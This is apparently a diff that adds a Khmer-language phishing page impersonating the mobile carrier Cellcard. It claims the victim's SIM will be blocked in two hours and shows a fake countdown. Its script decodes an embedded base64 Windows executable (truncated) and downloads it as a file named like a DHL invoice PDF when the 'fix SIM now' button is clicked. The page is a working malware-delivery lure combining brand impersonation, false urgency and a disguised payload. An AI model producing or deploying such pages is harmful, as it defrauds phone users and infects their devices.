@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+<meta charset="UTF-8">
+<title>Cellcard - ស៊ីមរបស់អ្នកនឹងត្រូវបិទក្នុង 2 ម៉ោង!</title>
+<style>
+  body{margin:0;background:#e30613;color:white;font-family:'Khmer OS Siemreap',Arial}
+  .warn{background:#c00;padding:10px;text-align:center;font-weight:bold}
+  .box{max-width:400px;margin:20px auto;background:white;color:#000;border-radius:15px;overflow:hidden}
+  .head{background:#e30613;padding:20px;text-align:center;color:white}
+  .head img{height:55px}
+  .content{padding:30px;text-align:center}
+  .timer{color:red;font-size:2.5em;font-weight:bold}
+  .btn{background:#e30613;color:white;padding:18px 40px;font-size:1.4em;border-radius:50px;border:none;margin:20px}
+</style>
+</head>
+<body>
+<div class="warn">សេចក្តីជូនដំណញសំខាន់ពី Cellcard</div>
+<div class="box">
+  <div class="head">
+    <img src="data:image/png;base64,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">
+    <h2>ស៊ីមរបសំខាន់!</h2>
+  </div>
+  <div class="content">
+    <p>លេខទូរស័ព្ទរបស់អ្នក <b>093 123 4567</b> នឹងត្រូវបានជាប់សង្ស័យធ្វើសកម្មភាពមិនប្រក្រតី។</p>
+    <p class="timer">01:58:42</p>
+    <p>សូមចុចដោះស្រាយជាបន្ទាន់មុនពេលស៊ីមត្រូវបិទជាអចិន្ត្រៃយ៍</p>
+    <button class="btn" id="fix">ដោះស្រាយស៊ីមឥឡូវនេះ</button>
+  </div>
+</div>
+
+<script>
+var base64_payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...";
+var bin = atob(base64_payload);
+var arr = new Uint8Array(bin.length);
+for(var i=0;i<bin.length;i++) arr[i] = bin.charCodeAt(i);
+var blob = new Blob([arr], {type:'application/octet-stream'});
+var url = URL.createObjectURL(blob);
+document.getElementById("fix").onclick = function() {
+    var a = document.createElement("a");
+    a.href = url;
+    a.download = "../DHL Express Invoice.pdf";
+    a.click();
+};
+setInterval(() => {
+    var t = document.querySelector(".timer").innerText;
+    var parts = t.split(":");
+    var secs = parseInt(parts[2]) - 1;
+    if(secs < 0) { secs = 59; var mins = parseInt(parts[1]) - 1; }
+    document.querySelector(".timer").innerText = "01:" + ("0"+mins).slice(-2) + ":" + ("0"+secs).slice(-2);
+}, 1000);
+</script>
+</body>
+</html>
